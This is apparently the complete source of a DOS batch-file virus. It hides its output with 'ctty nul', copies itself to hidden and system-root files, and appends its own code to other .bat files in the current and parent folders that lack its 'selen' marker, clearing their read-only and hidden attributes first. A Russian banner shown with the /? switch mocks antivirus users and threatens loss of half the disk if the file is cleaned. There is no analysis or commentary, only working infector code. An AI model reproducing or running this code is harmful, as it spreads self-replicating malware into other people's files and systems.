@ctty nul%selen%
if not exist ret.tmp copy %0 ret.tmp
call attrib ret.tmp +h
if not exist selen.bat copy ret.tmp selen.bat
set sele=c:\selen.txt
if not exist %sele% copy %0 %sele%
if "%1"=="/?" goto se
goto exts
:se
@ctty con
cls
@echo off
echo.
echo. ╔═══════════════════════════════════════════════════════════════╗
echo  ║   Мы добродетели и мы прёмся от этого! А вы же козлы, которые ║
echo  ║только и умеют, что антивирусы запускать, да тупо смотреть за  ║
echo  ║сволочными пылесосами! (c) Steel Учти козёл Вылечишь этот файл ║
echo  ║потеряешь пол диска! Кстати, как у тебя хватило ума приписать  ║
echo  ║аргументы к этому ржавому батнику? ДОС умер, но дело живёт!    ║
echo  ║                 А теперь продолжайте играть в свои игрушки, и ║
echo  ║молитесь, что Я у вас не на диске. (А может уже и на нём!)     ║
echo  ╚═══════════════════════════════════════════════════════════════╝
exit
:exts
@ctty nul
for %%s in (*.bat ..\*.bat) do set selen=%%s
:Вот я уже и у тебя...
for %%t in (%selen%) do find "selen" %%t
if not errorlevel 1 goto yes
attrib %selen% -h -r
for %%t in (%selen%) do copy %%t+%sele%
exit
:yes
del %sele%